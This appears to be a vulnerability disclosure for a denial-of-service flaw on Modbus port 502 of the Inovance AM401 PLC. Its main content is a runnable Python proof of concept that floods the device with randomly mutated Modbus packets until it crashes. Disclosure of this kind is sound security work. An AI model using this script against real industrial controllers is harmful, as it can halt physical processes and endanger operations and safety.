# Summary
There is a denial of service vulnerability in port 502 of Inovance AM401 PLC. An attacker can send a large number of modbus protocol data packets to cause the PLC to crash.

# Details
My host ip:![image](https://github.com/user-attachments/assets/7a6cd389-bddb-43c9-994c-5356f3468745)

Connectivity test of the device:
![image](https://github.com/user-attachments/assets/4c48b67b-3d88-4e49-9689-a3cd9046b9ce)

Nmap scans device ports:
![image](https://github.com/user-attachments/assets/9038fe3e-9051-4d16-b732-b579b933c96d)
You can see that port 502 is open.

Then we run the script:
![image](https://github.com/user-attachments/assets/62888b9e-8f0f-4a09-a26a-cd344c7c2345)

Soon you will see the device crash.
![image](https://github.com/user-attachments/assets/189ccdf2-398a-48bf-95f8-069994ebfbb4)
![image](https://github.com/user-attachments/assets/00e1625c-d950-4041-bc3c-986838f74292)


# PoC
My host ip is `192.168.1.149` and the device's ip is `192.168.1.88`.

```py
import socket

def F1(x):
    return x ^ 0xFF
    pass
def F2(x):
    return x ^ 0xFE
    pass
def F3(x):
    return (x-0x10) & 0xFF
    pass
def F4(x):
    return (x*0x17) & 0xFF
    pass

def F5(x):
    return (x**2) & 0xFF

def Change(data: bytes):
    l = len(data)
    import random
    pos = 0
    while ((pos==0) or (pos == 20)):
        pos = random.randint(0, l - 1) 
    Fs = [F1, F2, F3, F4, F5]
    f = random.randint(0, 4)  
    func = Fs[f]
    newX = func(data[pos])

    hex_str = format(newX, '02x')
    data = data[:pos] + bytes.fromhex(hex_str) + data[pos + 1:]

    return data

ori = "00 01 00 00 00 06 01 03 00 00 00 0a"
ori = bytes.fromhex(ori.replace(" ", ""))
queue = []

queue.append(ori)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.88",502))
MAX_LEN = 65536
cur = 0
first = False
while True:
    if((cur)%100 == 0):
        print(cur,end=' ')
    for i in range(8):
        top = queue[cur]
        now = Change(top)
        queue.append(now)
        try:
            s.send(now)
            import time
            # time.sleep(0.1)
            # s.close()
        except:
            if first == False:
                print()
                print("\033[91m[+] CRASHED!!!!!!!!!!!!!!!!!!\033[0m")
    cur = (cur + 1) % MAX_LEN
```

# Discoverer
https://github.com/N0zoM1z0

Li Chunan(804242129@qq.com)
